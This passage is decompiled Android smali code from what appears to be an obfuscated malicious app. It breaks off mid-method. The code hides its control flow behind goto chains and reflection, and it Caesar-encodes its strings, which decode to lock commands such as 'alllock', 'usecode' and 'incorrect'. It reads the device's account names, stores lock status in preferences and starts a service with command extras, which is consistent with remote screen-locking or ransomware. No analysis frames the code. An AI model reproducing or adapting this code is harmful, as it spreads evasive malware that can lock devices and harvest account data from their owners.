.class Lcom/EDzgPz/KwIOuS/VuqHca;
.super Landroid/os/AsyncTask;


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field private mContext:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 4
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    nop

    goto :goto_2

    :goto_0
    nop

    return-void

    nop

    goto :goto_3

    :goto_1
    nop

    iput-object p1, p0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_0

    :goto_2
    nop

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    nop

    goto :goto_1

    :goto_3
    nop

    nop
.end method

.method private capitalize(Ljava/lang/String;)Ljava/lang/String;
    .locals 5

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/VuqHca;->xcapitalize(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private xcapitalize(Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p1, "s"    # Ljava/lang/String;

    .prologue
    nop

    goto/16 :goto_11

    :goto_0
    nop

    goto/16 :goto_d

    nop

    goto/16 :goto_12

    :goto_1
    nop

    const/4 v3, 0x0

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const-string v3, "toString"

    const-class v6, Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    invoke-virtual {v3, v1, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Ljava/lang/String;

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    const-class v6, Ljava/lang/String;

    aput-object v6, v4, v3

    aput-object v2, v5, v3

    const-string v3, "append"

    const-class v6, Ljava/lang/StringBuilder;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    invoke-virtual {v3, v1, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/StringBuilder;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v6, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v3

    new-instance v6, Ljava/lang/Integer;

    invoke-direct {v6, v2}, Ljava/lang/Integer;-><init>(I)V

    aput-object v6, v5, v3

    const-string v3, "substring"

    const-class v6, Ljava/lang/String;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    invoke-virtual {v3, p1, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v2, 0x1

    nop

    goto :goto_3

    :goto_5
    nop

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_4

    :goto_6
    nop

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v6, Ljava/lang/Character;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v3

    new-instance v6, Ljava/lang/Character;

    invoke-direct {v6, v2}, Ljava/lang/Character;-><init>(C)V

    aput-object v6, v5, v3

    const-string v3, "valueOf"

    const-class v6, Ljava/lang/String;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v6, 0x0

    invoke-virtual {v3, v6, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    nop

    goto :goto_5

    :goto_7
    nop

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v6, Ljava/lang/Character;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v3

    new-instance v6, Ljava/lang/Character;

    invoke-direct {v6, v0}, Ljava/lang/Character;-><init>(C)V

    aput-object v6, v5, v3

    const-string v3, "toUpperCase"

    const-class v6, Ljava/lang/Character;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v6, 0x0

    invoke-virtual {v3, v6, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/Character;

    invoke-virtual {v3}, Ljava/lang/Character;->charValue()C

    move-result v2

    nop

    goto :goto_6

    :goto_8
    nop

    new-instance v1, Ljava/lang/StringBuilder;

    nop

    goto :goto_7

    :goto_9
    nop

    if-nez v1, :cond_1

    nop

    goto :goto_8

    :goto_a
    nop

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v6, Ljava/lang/Character;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v3

    new-instance v6, Ljava/lang/Character;

    invoke-direct {v6, v0}, Ljava/lang/Character;-><init>(C)V

    aput-object v6, v5, v3

    const-string v3, "isUpperCase"

    const-class v6, Ljava/lang/Character;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    const/4 v6, 0x0

    invoke-virtual {v3, v6, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/Boolean;

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    nop

    goto :goto_9

    :goto_b
    nop

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v6, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v6, v4, v3

    new-instance v6, Ljava/lang/Integer;

    invoke-direct {v6, v1}, Ljava/lang/Integer;-><init>(I)V

    aput-object v6, v5, v3

    const-string v3, "charAt"

    const-class v6, Ljava/lang/String;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    invoke-virtual {v3, p1, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/Character;

    invoke-virtual {v3}, Ljava/lang/Character;->charValue()C

    move-result v0

    nop

    goto :goto_a

    :cond_0
    :goto_c
    nop

    const/4 v1, 0x0

    nop

    goto :goto_b

    :cond_1
    :goto_d
    nop

    return-object p1

    nop

    goto :goto_c

    :cond_2
    :goto_e
    nop

    const-string p1, ""

    invoke-static/range {p1 .. p1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    nop

    goto :goto_d

    :goto_f
    nop

    if-nez v1, :cond_0

    nop

    goto :goto_e

    :goto_10
    nop

    const/4 v3, 0x0

    new-array v4, v3, [Ljava/lang/Class;

    new-array v5, v3, [Ljava/lang/Object;

    const-string v3, "length"

    const-class v6, Ljava/lang/String;

    invoke-virtual {v6, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v3

    invoke-virtual {v3, p1, v5}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/Integer;

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v1

    nop

    goto :goto_f

    :goto_11
    nop

    if-eqz p1, :cond_2

    nop

    goto :goto_10

    :goto_12
    nop

    nop
.end method

.method private bridge varargs synthetic xdoInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 5

    .prologue
    nop

    goto :goto_2

    :goto_0
    nop

    return-object v0

    nop

    goto :goto_3

    :goto_1
    nop

    invoke-virtual {p0, p1}, Lcom/EDzgPz/KwIOuS/VuqHca;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    nop

    goto :goto_0

    :goto_2
    nop

    check-cast p1, [Ljava/lang/String;

    nop

    goto :goto_1

    :goto_3
    nop

    nop
.end method

.method private varargs xdoInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 39
    .param p1, "params"    # [Ljava/lang/String;

    .prologue
    nop

    goto/16 :goto_217

    :goto_0
    nop

    goto/16 :goto_25

    nop

    goto/16 :goto_218

    :goto_1
    nop

    invoke-virtual/range {v34 .. v35}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    nop

    goto :goto_0

    :goto_2
    nop

    invoke-virtual/range {v35 .. v35}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_1

    :goto_3
    nop

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v35

    nop

    goto :goto_2

    :goto_4
    nop

    move-object/from16 v0, v35

    nop

    goto :goto_3

    :goto_5
    nop

    invoke-direct/range {v35 .. v36}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_4

    :goto_6
    nop

    const-string v36, "Fyq>"

    invoke-static/range {v36 .. v36}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v36

    nop

    goto :goto_5

    :goto_7
    nop

    new-instance v35, Ljava/lang/StringBuilder;

    nop

    goto :goto_6

    :goto_8
    nop

    sget-object v34, Ljava/lang/System;->out:Ljava/io/PrintStream;

    nop

    goto :goto_7

    :catch_0
    :goto_9
    move-exception v13

    nop

    goto :goto_8

    :goto_a
    nop

    goto/16 :goto_12b

    nop

    goto :goto_9

    :goto_b
    :try_start_0
    nop

    invoke-virtual {v14}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    nop

    goto :goto_a

    :goto_c
    move-exception v14

    nop

    goto :goto_b

    :goto_d
    nop

    goto/16 :goto_1eb

    nop

    goto :goto_c

    :cond_0
    :goto_e
    nop

    add-int/lit8 v34, v34, 0x1

    nop

    goto :goto_d

    :goto_f
    nop

    invoke-virtual/range {v36 .. v36}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v16

    nop

    goto :goto_e

    :goto_10
    nop

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v36

    nop

    goto :goto_f

    :goto_11
    nop

    move-object/from16 v1, v24

    nop

    goto :goto_10

    :goto_12
    nop

    move-object/from16 v0, v36

    nop

    goto :goto_11

    :goto_13
    nop

    invoke-virtual/range {v36 .. v37}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v36

    nop

    goto :goto_12

    :goto_14
    nop

    const-string v37, "-!"

    invoke-static/range {v37 .. v37}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v37

    nop

    goto :goto_13

    :goto_15
    nop

    invoke-direct/range {v36 .. v37}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_14

    :goto_16
    nop

    invoke-static/range {v16 .. v16}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v37

    nop

    goto :goto_15

    :goto_17
    nop

    new-instance v36, Ljava/lang/StringBuilder;

    nop

    goto :goto_16

    :goto_18
    nop

    move-object/from16 v24, v0

    nop

    goto :goto_17

    :goto_19
    nop

    iget-object v0, v3, Landroid/accounts/Account;->name:Ljava/lang/String;

    nop

    goto :goto_18

    :goto_1a
    nop

    if-eqz v36, :cond_0

    nop

    goto :goto_19

    :goto_1b
    nop

    invoke-virtual/range {v36 .. v36}, Ljava/util/regex/Matcher;->matches()Z

    move-result v36

    nop

    goto :goto_1a

    :goto_1c
    nop

    invoke-virtual {v0, v1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v36

    nop

    goto :goto_1b

    :goto_1d
    nop

    move-object/from16 v1, v36

    nop

    goto :goto_1c

    :goto_1e
    nop

    move-object/from16 v0, v17

    nop

    goto :goto_1d

    :goto_1f
    nop

    move-object/from16 v36, v0

    nop

    goto :goto_1e

    :goto_20
    nop

    iget-object v0, v3, Landroid/accounts/Account;->name:Ljava/lang/String;

    nop

    goto :goto_1f

    :cond_1
    :goto_21
    nop

    aget-object v3, v4, v34

    nop

    goto :goto_20

    :goto_22
    nop

    goto/16 :goto_1fd

    nop

    goto :goto_21

    :cond_2
    :goto_23
    nop

    const/16 v20, 0x0

    nop

    goto :goto_22

    :goto_24
    nop

    return-object v34

    nop

    goto :goto_23

    :cond_3
    :goto_25
    nop

    const/16 v34, 0x0

    nop

    goto :goto_24

    :goto_26
    nop

    invoke-virtual/range {v34 .. v35}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    nop

    goto :goto_25

    :goto_27
    nop

    invoke-direct/range {v35 .. v37}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    nop

    goto :goto_26

    :goto_28
    nop

    const-class v37, Lcom/EDzgPz/KwIOuS/dNuGTM;

    nop

    goto :goto_27

    :goto_29
    nop

    move-object/from16 v36, v0

    nop

    goto :goto_28

    :goto_2a
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_29

    :goto_2b
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_2a

    :goto_2c
    nop

    new-instance v35, Landroid/content/Intent;

    nop

    goto :goto_2b

    :goto_2d
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_2c

    :goto_2e
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_2d

    :goto_2f
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_2e

    :goto_30
    nop

    invoke-interface {v15}, Landroid/content/SharedPreferences$Editor;->commit()Z

    nop

    goto :goto_2f

    :goto_31
    nop

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_30

    :goto_32
    nop

    move-object/from16 v1, v35

    nop

    goto :goto_31

    :goto_33
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_32

    :goto_34
    nop

    const-string v35, ""

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_33

    :goto_35
    nop

    const-string v34, "qdpef"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_34

    :goto_36
    nop

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_35

    :goto_37
    nop

    move/from16 v1, v35

    nop

    goto :goto_36

    :goto_38
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_37

    :goto_39
    nop

    const/16 v35, 0x0

    nop

    goto :goto_38

    :goto_3a
    nop

    const-string v34, "bojnbujpo"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_39

    :goto_3b
    nop

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_3a

    :goto_3c
    nop

    move/from16 v1, v35

    nop

    goto :goto_3b

    :goto_3d
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_3c

    :goto_3e
    nop

    const/16 v35, 0x0

    nop

    goto :goto_3d

    :goto_3f
    nop

    const-string v34, "tubuvt"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_3e

    :goto_40
    nop

    invoke-interface/range {v28 .. v28}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v15

    nop

    goto :goto_3f

    :goto_41
    nop

    invoke-virtual/range {v34 .. v36}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v28

    nop

    goto :goto_40

    :goto_42
    nop

    const/16 v36, 0x0

    nop

    goto :goto_41

    :goto_43
    nop

    const-string v35, "dpdpo"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_42

    :goto_44
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_43

    :goto_45
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_44

    :goto_46
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_45

    :goto_47
    nop

    invoke-static/range {v34 .. v35}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    nop

    goto :goto_46

    :goto_48
    nop

    const-string v35, "pppqqqttt"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_47

    :goto_49
    nop

    const-string v34, "nvvvv"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_48

    :goto_4a
    nop

    if-eqz v34, :cond_3

    nop

    goto :goto_49

    :goto_4b
    nop

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v34

    nop

    goto :goto_4a

    :goto_4c
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_4b

    :goto_4d
    nop

    move-object/from16 v0, v27

    nop

    goto :goto_4c

    :cond_4
    :goto_4e
    nop

    const-string v34, "bmmmpdl"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_4d

    :goto_4f
    nop

    invoke-virtual/range {v34 .. v35}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    nop

    goto :goto_4e

    :goto_50
    nop

    invoke-direct/range {v35 .. v37}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    nop

    goto :goto_4f

    :goto_51
    nop

    const-class v37, Lcom/EDzgPz/KwIOuS/dNuGTM;

    nop

    goto :goto_50

    :goto_52
    nop

    move-object/from16 v36, v0

    nop

    goto :goto_51

    :goto_53
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_52

    :goto_54
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_53

    :goto_55
    nop

    new-instance v35, Landroid/content/Intent;

    nop

    goto :goto_54

    :goto_56
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_55

    :goto_57
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_56

    :goto_58
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_57

    :goto_59
    nop

    invoke-interface {v15}, Landroid/content/SharedPreferences$Editor;->commit()Z

    nop

    goto :goto_58

    :goto_5a
    nop

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_59

    :goto_5b
    nop

    move/from16 v1, v35

    nop

    goto :goto_5a

    :goto_5c
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_5b

    :goto_5d
    nop

    const/16 v35, 0x4

    nop

    goto :goto_5c

    :goto_5e
    nop

    const-string v34, "tubuvt"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_5d

    :goto_5f
    nop

    invoke-interface/range {v28 .. v28}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v15

    nop

    goto :goto_5e

    :goto_60
    nop

    invoke-virtual/range {v34 .. v36}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v28

    nop

    goto :goto_5f

    :goto_61
    nop

    const/16 v36, 0x0

    nop

    goto :goto_60

    :goto_62
    nop

    const-string v35, "dpdpo"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_61

    :goto_63
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_62

    :goto_64
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_63

    :goto_65
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_64

    :goto_66
    nop

    if-eqz v34, :cond_4

    nop

    goto :goto_65

    :goto_67
    nop

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v34

    nop

    goto :goto_66

    :goto_68
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_67

    :goto_69
    nop

    move-object/from16 v0, v27

    nop

    goto :goto_68

    :cond_5
    :goto_6a
    nop

    const-string v34, "vtfdpef"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_69

    :goto_6b
    nop

    invoke-virtual/range {v34 .. v35}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    nop

    goto :goto_6a

    :goto_6c
    nop

    invoke-direct/range {v35 .. v37}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    nop

    goto :goto_6b

    :goto_6d
    nop

    const-class v37, Lcom/EDzgPz/KwIOuS/dNuGTM;

    nop

    goto :goto_6c

    :goto_6e
    nop

    move-object/from16 v36, v0

    nop

    goto :goto_6d

    :goto_6f
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_6e

    :goto_70
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_6f

    :goto_71
    nop

    new-instance v35, Landroid/content/Intent;

    nop

    goto :goto_70

    :goto_72
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_71

    :goto_73
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_72

    :goto_74
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_73

    :goto_75
    nop

    invoke-interface {v15}, Landroid/content/SharedPreferences$Editor;->commit()Z

    nop

    goto :goto_74

    :goto_76
    nop

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_75

    :goto_77
    nop

    move/from16 v1, v35

    nop

    goto :goto_76

    :goto_78
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_77

    :goto_79
    nop

    const/16 v35, 0x3

    nop

    goto :goto_78

    :goto_7a
    nop

    const-string v34, "tubuvt"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_79

    :goto_7b
    nop

    invoke-interface/range {v28 .. v28}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v15

    nop

    goto :goto_7a

    :goto_7c
    nop

    invoke-virtual/range {v34 .. v36}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v28

    nop

    goto :goto_7b

    :goto_7d
    nop

    const/16 v36, 0x0

    nop

    goto :goto_7c

    :goto_7e
    nop

    const-string v35, "dpdpo"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_7d

    :goto_7f
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_7e

    :goto_80
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_7f

    :goto_81
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_80

    :goto_82
    nop

    if-eqz v34, :cond_5

    nop

    goto :goto_81

    :goto_83
    nop

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v34

    nop

    goto :goto_82

    :goto_84
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_83

    :goto_85
    nop

    move-object/from16 v0, v27

    nop

    goto :goto_84

    :cond_6
    :goto_86
    nop

    const-string v34, "jodpssfdu"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_85

    :goto_87
    nop

    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    nop

    goto :goto_86

    :goto_88
    nop

    move-object/from16 v1, v19

    nop

    goto :goto_87

    :goto_89
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_88

    :goto_8a
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_89

    :goto_8b
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_8a

    :goto_8c
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_8b

    :goto_8d
    nop

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    nop

    goto :goto_8c

    :goto_8e
    nop

    move-object/from16 v2, v35

    nop

    goto :goto_8d

    :goto_8f
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_8e

    :goto_90
    nop

    move-object/from16 v0, v19

    nop

    goto :goto_8f

    :goto_91
    nop

    const-string v35, "bmmdmptf"

    invoke-static/range {v35 .. v35}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v35

    nop

    goto :goto_90

    :goto_92
    nop

    const-string v34, "dmptf"

    invoke-static/range {v34 .. v34}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v34

    nop

    goto :goto_91

    :goto_93
    nop

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    nop

    goto :goto_92

    :goto_94
    nop

    move-object/from16 v2, v35

    nop

    goto :goto_93

    :goto_95
    nop

    move-object/from16 v1, v34

    nop

    goto :goto_94

    :goto_96
    nop

    move-object/from16 v0, v19

    nop

    goto :goto_95

    :goto_97
    nop

    const-class v35, Lcom/EDzgPz/KwIOuS/dNuGTM;

    nop

    goto :goto_96

    :goto_98
    nop

    move-object/from16 v34, v0

    nop

    goto :goto_97

    :goto_99
    nop

    iget-object v0, v0, Lcom/EDzgPz/KwIOuS/VuqHca;->mContext:Landroid/content/Context;

    nop

    goto :goto_98

    :goto_9a
    nop

    move-object/from16 v0, p0

    nop

    goto :goto_99

    :goto_9b
    nop

    new-instance v19, Landroid/content/Intent;

    nop

    goto :goto_9a

    :goto_9c
    nop

    invoke-interface {v15}, Landroid/content/SharedPreferences$Editor;->commit()Z

    nop

    goto :goto_9b

    :goto_9d
    nop

    invoke-interface {v15, v0, v1}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_9c

    :goto_9e
    nop

    move/from16 v1, v35

    nop

    goto :goto_9d

    :goto_9f
    nop

    move-object/from16 v0, v34

    nop

    goto :goto_9e

    :goto_a0
    nop

    const/16 v35, 0x4d

    nop

    goto :goto_9f

    :goto_a1
    nop

    const-string v34, "tubuvt"

